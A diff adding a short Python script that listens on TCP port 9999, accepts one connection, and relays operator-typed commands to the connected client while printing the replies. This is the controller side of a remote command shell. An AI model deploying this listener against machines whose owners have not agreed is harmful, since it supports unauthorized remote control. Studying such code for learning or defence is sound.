@@ -1,0 +1,70 @@
+import socket
+import sys
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("connection error message " + str(msg)
+)
+
+# Binding the socket and listening for connections
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+
+        print("Binding The Port: " + str(port))
+        s.bind((host, port))
+        s.listen(5)
+
+        print("Socket is listening...")
+
+    except socket.error as msg:
+        print("Socket binding error " + str(msg) + "\nRetrying...")
+        sys.exit()
+
+
+
+
+def socket_accept(): 
+    conn, address = s.accept() 
+    print("Connection has been established! |" + " IP " + address[0] + " | Port " + str(address[1]))
+    send_command(conn)
+    conn.close()
+
+
+def send_command(con) : 
+        while True : 
+            cmd = input()
+            if cmd == 'quit': 
+                con.close()
+                s.close()
+                sys.exit()
+                
+            if len(str.encode(cmd)) > 0 : 
+                try:
+                    con.send(str.encode(cmd))
+                    client_response = str(con.recv(1024), "utf-8")
+                    print(client_response, end="")      
+
+                except socket.error:
+                    print("\nClient disconnected!")
+                    con.close()
+                    break 
+
+
+def main (): 
+
+    socket_create()
+    bind_socket()   
+    socket_accept()
+
+main()
